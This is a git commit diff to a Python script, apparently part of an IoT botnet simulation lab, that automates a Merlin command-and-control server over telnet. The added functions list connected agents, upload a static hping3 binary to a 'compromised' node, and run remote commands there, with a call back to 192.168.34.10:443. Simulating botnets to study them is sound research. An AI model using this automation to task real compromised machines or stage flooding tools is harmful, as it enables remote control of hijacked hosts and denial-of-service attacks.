0e405189bc1add6129329b47b0123505767d8dfe
Xabier SdC <xabiersdc@gmail.com>
2022-06-10 14:07:04 +0200

    Update merlin functions

--- src/run_merlin.py
+++ src/run_merlin.py
@@ -1,3 +1,4 @@
+import re
 import time
 import docker
 from telnetlib import Telnet
@@ -37,6 +38,83 @@ def start_merlin_cnc_listener(hostname: str, telnet_port: int, sleep_time: float
         time.sleep(sleep_time * 3)
         print(tn.read_very_eager().decode("utf-8"))
 
+        tn.write(b"back\n")
+        time.sleep(sleep_time)
+        print(tn.read_very_eager().decode("utf-8"))
+
+        tn.write(b"back\n")
+        time.sleep(sleep_time)
+        print(tn.read_very_eager().decode("utf-8"))
+
+
+def list_merlin_cnc_connected_bots(hostname: str, telnet_port: int, sleep_time: float = 2) -> None:
+    """ List connected bots.
+    """
+
+    with Telnet(hostname, telnet_port) as tn:
+        print(tn.read_very_eager().decode("utf-8"))
+
+        tn.write(b"agent list\n")
+        time.sleep(sleep_time)
+        agents_table = tn.read_very_eager().decode("utf-8")
+        print(agents_table)
+        return agents_table
+
+
+def parse_agent_table(agent_table):
+    agents = []
+    uuidre = re.compile("([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})")
+    for line in agent_table.split("\n"):
+        line = line.strip()
+        match = re.search(uuidre, line)
+        if match:
+            agents.append((match.group(1), line))
+    return agents
+
+
+def merlin_cnc_tool_transfer_agent(hostname: str, telnet_port: int, agent_id: str, sleep_time: float = 2) -> None:
+    """ Transfer files.
+    - agent interact [tab]
+    - upload /opt/hping3/hping3-static /opt/hping3
+    """
+
+    with Telnet(hostname, telnet_port) as tn:
+        print(tn.read_very_eager().decode("utf-8"))
+
+        tn.write(f"agent interact {agent_id}\n".encode("ascii"))
+        time.sleep(sleep_time)
+        print(tn.read_very_eager().decode("utf-8"))
+
+        tn.write(b"upload /opt/hping3/hping3-static /opt/hping3\n")
+        time.sleep(sleep_time)
+        print(tn.read_very_eager().decode("utf-8"))
+
+        tn.write(b"back\n")
+        time.sleep(sleep_time)
+        print(tn.read_very_eager().decode("utf-8"))
+
+
+def merlin_cnc_remote_cmd_agent(hostname: str, telnet_port: int, agent_id: str, cmd: str, sleep_time: float = 2) -> None:
+    """ Transfer files.
+    - agent interact [tab]
+    - upload /opt/hping3/hping3-static /opt/hping3
+    """
+
+    with Telnet(hostname, telnet_port) as tn:
+        print(tn.read_very_eager().decode("utf-8"))
+
+        tn.write(f"agent interact {agent_id}\n".encode("ascii"))
+        time.sleep(sleep_time)
+        print(tn.read_very_eager().decode("utf-8"))
+
+        tn.write(f"run {cmd}\n".encode("ascii"))
+        time.sleep(sleep_time)
+        print(tn.read_very_eager().decode("utf-8"))
+
+        tn.write(b"back\n")
+        time.sleep(sleep_time)
+        print(tn.read_very_eager().decode("utf-8"))
+
 
 def exec_merlin_agent(merlin_bot_container, cnc_addr: str, cnc_port: int, cnc_sleep: int):
     """ Start merlin agent bot
@@ -60,3 +138,18 @@ merlin_cnc = next(filter(lambda i: i.name == "iotsim-merlin-cnc-1", all_iot))
 merlin_cnc_h, merlin_cnc_p = get_node_telnet_host_port(server, project, merlin_cnc.id)
 
 start_merlin_cnc_listener(merlin_cnc_h, merlin_cnc_p)
+
+merlin_bot = next(filter(lambda i: "compromised" in i.name, all_iot))
+container_merlin_bot = docker_client.containers.get(get_node_docker_container_id(server, project, merlin_bot.id))
+
+exec_merlin_agent(container_merlin_bot, "192.168.34.10", 443, 20)
+time.sleep(30)
+
+agent_list = parse_agent_table(list_merlin_cnc_connected_bots(merlin_cnc_h, merlin_cnc_p))
+print(agent_list)
+
+merlin_cnc_tool_transfer_agent(merlin_cnc_h, merlin_cnc_p, agent_list[0][0])
+time.sleep(30)
+
+merlin_cnc_remote_cmd_agent(merlin_cnc_h, merlin_cnc_p, agent_list[0][0], "chmod 775 /opt/hping3")
+
